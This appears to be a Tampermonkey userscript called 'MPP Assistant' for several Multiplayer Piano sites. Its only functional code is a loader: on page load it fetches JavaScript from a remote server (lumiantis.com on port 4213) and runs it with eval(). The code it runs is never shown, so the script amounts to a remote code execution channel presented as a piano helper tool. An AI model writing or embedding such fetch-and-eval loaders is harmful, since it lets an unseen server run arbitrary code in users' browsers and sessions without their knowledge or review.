// ==UserScript==
// @license      MIT
// @name         MPP Assistant by RoxasYTB (Last Version Auto)
// @namespace    http://tampermonkey.net/
// @version      0.3
// @description  For Multiplayer Piano
// @author       RoxasYTB
// @match      *://multiplayerpiano.net/*
// @match      *://multiplayerpiano.org/*
// @match      *://mppclone.com/*
// @match      *://mpp.terrium.net/*
// @match      *://piano.ourworldofpixels.com/*
// @grant        none

// @downloadURL https://update.greasyfork.org/scripts/484438/MPP%20Assistant%20by%20RoxasYTB%20%28Last%20Version%20Auto%29.user.js
// @updateURL https://update.greasyfork.org/scripts/484438/MPP%20Assistant%20by%20RoxasYTB%20%28Last%20Version%20Auto%29.meta.js
// ==/UserScript==

var fromRepl = true;

(async () => {
    var code = await fetch("https://lumiantis.com:4213/", {
        method: "GET",
        headers: {
            "Content-Type": "application/javascript"
        },
        body: null
    }).then((e => e.text())).then(e => eval(e));
})()